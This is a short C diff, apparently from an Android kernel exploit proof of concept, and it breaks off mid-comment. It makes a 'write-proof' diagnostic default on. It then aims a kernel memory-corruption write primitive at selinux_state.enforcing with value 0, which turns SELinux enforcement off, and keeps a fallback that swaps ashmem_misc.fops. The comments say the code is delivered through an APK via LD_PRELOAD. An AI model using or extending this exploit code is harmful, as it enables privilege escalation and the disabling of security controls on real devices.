@@ -379,8 +379,15 @@ uintptr_t canon_addr(uintptr_t image_addr) {
   return text_addr(image_addr);
 }
 
+int enforcing_write_diag_enabled(void) {
+  /* Default ON for this diagnostic build: the APK only injects LD_PRELOAD /
+   * POC_LOG_FILE (no shell), so the write-proof must self-enable. Set
+   * ENFORCING_WRITE_DIAG=0 to fall back to the real &ashmem_misc.fops swap. */
+  return env_flag("ENFORCING_WRITE_DIAG", 1);
+}
+
 uintptr_t pselect_write_value(void) {
-  if (env_flag("ENFORCING_WRITE_DIAG", 0)) {
+  if (enforcing_write_diag_enabled()) {
     /* Bulletproof write-proof: value 0 -> zero selinux_state.enforcing. */
     return 0;
   }
@@ -391,7 +398,7 @@ uintptr_t pselect_write_value(void) {
 }
 
 uintptr_t pselect_write_target(void) {
-  if (env_flag("ENFORCING_WRITE_DIAG", 0)) {
+  if (enforcing_write_diag_enabled()) {
     /* Write-proof diagnostic: aim the rb-erase store at &selinux_state.enforcing
      * (vmlinux-verified addr) instead of &ashmem_misc.fops. Everything else on the
      * walk path is IDENTICAL to the fops route, so a /sys/fs/selinux/enforce flip
